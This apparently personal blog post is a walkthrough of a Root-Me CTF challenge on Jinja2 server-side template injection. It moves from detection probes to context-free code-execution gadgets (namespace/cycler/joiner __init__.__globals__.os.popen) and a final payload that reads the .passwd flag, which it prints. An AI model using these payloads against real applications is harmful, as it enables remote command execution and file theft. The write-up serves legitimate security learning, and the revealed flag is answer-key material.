+++ 
title = "From Detection to Flag: Python Jinja2 SSTI on Root-Me"
description = "A step-by-step walkthrough of solving a Python SSTI challenge on Root-Me, from initial detection to crafting a context-free Jinja2 payload for code execution."
date = "2025-09-11"
draft = false
tags = ['ssti', 'ctf', 'python', 'jinja2', 'root-me', 'walkthrough']
+++

I recently tackled a fun Server-side Template Injection (SSTI) challenge on Root-Me and wanted to document my process. This post follows my journey from initial detection to crafting a reliable, context-free payload to gain code execution.

## The Challenge: Python SSTI Introduction

The goal was to solve the "Python - Server-side Template Injection Introduction" challenge on [Root-me.org](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction?lang=en).

### << SETUP >>

I started by loading the challenge environment and intercepting the requests using Caido. The application allows you to preview content submitted through a form.

### << DETECT >>

The core of the application is a POST request to `/preview` with `title` and `content` parameters.

```http
POST /preview HTTP/1.1
Host: challenge01.root-me.org:59074
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

title=hi&content=hi&button=yes
```

To test for SSTI, I sent a simple mathematical expression, `{{7*7}}`, in both the `title` and `content` fields. The server's response was revealing:

```json
{
    "content": "49",
    "title": "{{7*7}}"
}
```

The `content` field was processed, while the `title` field was not. This confirmed an SSTI vulnerability in the `content` parameter. To be certain about the template engine, I tried two different payloads:

1.  `{{3 * 3}}` resulted in `9`.
2.  `{{'3' * 3}}` resulted in `333`.

This behavior is characteristic of Jinja2, confirming my suspicion.

### << EXPLORE >>

With the vulnerability confirmed, the next step was to find a way to execute shell commands. My goal was to access the `os` module in Python.

#### The Problem with Context-Dependent Payloads

In previous challenges, like one from picoCTF, I had used "egg hunter" payloads that depend on the application's context. For example:

```python
{{ ''.__class__.__base__.__subclasses__()[356]('ls -la', shell=True, stdout=-1).communicate()[0].decode() }}
```

The problem with this method is that the index for `popen` (`[356]`) is not consistent across different environments. It's a brittle approach. I wanted to find a more reliable, context-independent payload.

#### The Quest for a Context-Free Payload

I drew inspiration from the GreHack 2021 talk by @podalirius_, "[Optimizing Server Side Template Injections payloads for jinja2](https://www.youtube.com/watch?v=ahBxZkOTdg0)", which discusses creating context-free payloads.

The ideal payload should be:
1.  **Context-free:** It shouldn't rely on any data passed into the `.render()` method.
2.  **Short:** Shorter is always better.

The key is the `self` object, which is a reference to the template itself and is accessible even with an empty `.render()` call.

```python
>>> jinja2.Template("""I am {{ self }}""").render()
'I am <TemplateReference None>'
```

From this `self` object, we should be able to find a path to the `os` module.

#### Finding the Path with BFS

Python's objects and attributes can be thought of as a graph. To find the shortest path from our starting object (`jinja2`) to our target (`os`), we can use a Breadth-First Search (BFS). This helps avoid long exploration traps and cycles.

During this exploration, I got a bit confused about the distinction between objects, attributes, and modules in Python. They all felt very similar. I got a great explanation:

> **You're right to feel they're similar—in Python, almost everything, including modules and functions, is fundamentally an object. The difference lies in their role and relationship to each other.**
> 
> **Object (obj):** The most basic building block. An instance of a class (e.g., an integer, a list, a function, a module).
> 
> **Attribute (attr):** A name that belongs to an object, accessed with the dot notation (`parent_object.attribute`). It can be a variable or a method.
> 
> **Module:** A specific type of object whose main job is to organize Python code, acting as a namespace for its attributes.

With that clarified, I wrote a small BFS script (`audit.py`) to search for paths from the `jinja2` object to the `os` module. It found several promising paths:

```bash
$ ./audit.py jinja2
Searching for 'os' from 'jinja2' (max depth: 5)...
jinja2.bccache.fnmatch.os
jinja2.bccache.os
jinja2.bccache.tempfile._os
jinja2.environment.os
jinja2.loaders.os
jinja2.utils.os
```

This confirmed that a path exists. Now, how to get there from `self`?

#### From `self` to `os`

First, I inspected the `self` object using `dir()`:

```python
>>> jinja2.Template("""{{ f(self) }}""").render(f=dir)
"['__class__', '__delattr__', ..., '_TemplateReference__context']"
```

Most attributes were internal dunder methods, but `_TemplateReference__context` looked interesting.

```python
>>> jinja2.Template("""{{ self._TemplateReference__context }}""").render()
"<Context {'range': ..., 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>} of None>"
```

This context object gives us access to several Jinja2 utility classes like `cycler`, `joiner`, and `namespace`. My BFS search showed that `jinja2.utils.os` was a valid path. Since `namespace` is in `jinja2.utils`, I could traverse from there to the `os` module using Python's object introspection capabilities (`__init__.__globals__`).

This gives us a reliable path to `os`:

```python
{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
```

Even better, since `namespace`, `cycler`, and `joiner` are available in the global context of the template, we can access them directly without referencing `self`. This leads to a much cleaner and shorter payload.

#### The Final Gadgets

This discovery yielded three reliable, context-free gadgets for Jinja2 SSTI:

```python
{{ namespace.__init__.__globals__.os.popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen("id").read() }}
{{ joiner.__init__.__globals__.os.popen("id").read() }}
```

### << EXPLOIT >>

Now it was time to use these gadgets on the challenge server. I sent the payload in the `content` parameter:

```
content={{ namespace.__init__.__globals__.os.popen("ls -la").read() }}
```

The server responded with a directory listing, and I spotted a `.passwd` file.

#### A Failed Experiment: `popen` vs. `Popen`

To get a nicely formatted output, I first tried to use the `communicate()` method, which I had used in the past:

```python
{{ namespace.__init__.__globals__.os.popen('id', shell=True, stdout=-1).communicate()[0].decode() }}
```

This resulted in an error: `TypeError: popen() got an unexpected keyword argument 'shell'`.

This was a key learning moment. I realized I was confusing `os.popen()` with the more powerful `subprocess.Popen`. The `os.popen` function is simpler and doesn't accept those arguments. The payload I used in the picoCTF challenge was accessing `subprocess.Popen`, not `os.popen`.

#### Getting the Flag

To solve the formatting issue and read the file, I switched to `readlines()`, which returns the output as a list of strings, preserving newlines.

**Final Payload:**

```
content={{ namespace.__init__.__globals__.os.popen('cat .passwd').readlines() }}
```

**Response:**

```json
{
    "content": "['Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n']",
    "title": "hi"
}
```

Success! I found the flag.

## Final Thoughts

This challenge was a great exercise in moving beyond simple, context-dependent SSTI payloads. The journey was just as important as the result. By hitting a wall with `os.popen`, taking the time to understand the object graph with BFS, and clarifying fundamental Python concepts, I was able to build a short, reliable, and context-free gadget for code execution. It highlights the importance of deep-diving into the framework you're targeting and not being afraid to go back to the basics.

---

## Related Posts

*   [My First SSTI Adventure: A PicoCTF Walkthrough](/post/picoctf-ssti-journey/)
*   [Deepening My SSTI Knowledge: Java SSTI on Root-Me](/post/ssti-study-and-rootme-challenge/)
